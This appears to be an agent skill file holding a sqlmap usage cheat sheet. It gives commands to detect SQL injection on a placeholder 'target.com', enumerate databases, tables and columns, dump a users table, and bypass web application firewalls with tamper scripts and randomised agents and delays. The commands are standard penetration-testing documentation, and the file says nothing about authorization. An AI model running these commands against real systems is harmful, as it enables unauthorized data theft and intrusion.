---
name: sqlmap
description: Automated SQL injection detection and exploitation
category: tooling
---

# SQLMap Usage Guide

SQLMap automates detection and exploitation of SQL injection vulnerabilities.

## Common Usage
```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1"

# With POST data
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# Cookie-based auth
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123"

# Database enumeration
sqlmap -u "https://target.com/page?id=1" --dbs

# Table enumeration
sqlmap -u "https://target.com/page?id=1" -D database --tables

# Column enumeration
sqlmap -u "https://target.com/page?id=1" -D database -T users --columns

# Data dump
sqlmap -u "https://target.com/page?id=1" -D database -T users --dump
```

## Risk & Level
```bash
# Level 1-5: higher = more payloads + boundaries
sqlmap -u "https://target.com/page?id=1" --level=3 --risk=2

# Time-based blind with heavy load
sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10
```

## WAF Bypass
```bash
# Tamper scripts
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between

# Random agent and delay
sqlmap -u "https://target.com/page?id=1" --random-agent --delay=2
```

## Best Practices
- Always start with `--level=1 --risk=1`
- Use `--batch` for automation
- Specify DBMS if known to speed up
- Use thread count appropriate for target
